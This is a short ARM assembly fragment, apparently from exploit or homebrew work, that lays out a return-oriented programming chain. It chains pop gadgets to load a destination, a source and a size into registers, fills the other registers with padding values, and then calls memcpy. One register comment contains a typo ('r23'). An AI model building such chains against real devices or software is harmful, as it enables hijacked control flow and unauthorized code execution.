.word ROP_POP {r0, pc}
	.word dst ; r0
.word ROP_POP_R1PC ; pop {r1, pc}
		.word src ; r1
.word ROP_POP_R2R3R4R5R6PC ; pop {r2, r23, r4, r5, r6, pc}
	.word size ; r2
	.word 0xDEADBABE ; r3 (garbage)
	.word 0xDEADBABE ; r4 (garbage)
	.word 0xDEADBABE ; r5 (garbage)
	.word 0xDEADBABE ; r6 (garbage)
.word MEMCPY